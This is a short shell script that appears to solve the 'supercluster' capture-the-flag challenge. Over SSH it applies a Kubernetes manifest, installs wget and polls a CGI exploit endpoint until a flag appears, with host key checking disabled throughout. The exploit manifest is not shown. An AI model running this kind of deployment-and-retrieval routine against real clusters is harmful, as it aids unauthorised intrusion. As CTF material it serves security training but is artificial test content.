#!/bin/sh
remote="${1:--p 2022 ctf@localhost}"
echo "Using remote $remote"
echo 'Change with e.g.: ./solution.sh "-p 2222 dbc389a1d97caa1e7ae4f66d-2022-supercluster@challenge.cscg.live"'

# deploy solution resources
ssh -o StrictHostKeyChecking=no $remote kubectl apply -f - < solution.yaml

ssh -o StrictHostKeyChecking=no $remote "sudo apt update && sudo apt install -y wget"

while true; do
    resp=$(ssh -o StrictHostKeyChecking=no $remote wget supercluster.flag/cgi-bin/exp.sh -O -)
    echo "$resp"
    if [[ "$resp" == *"flag:"* ]]; then
        break
    fi
    sleep 5
done
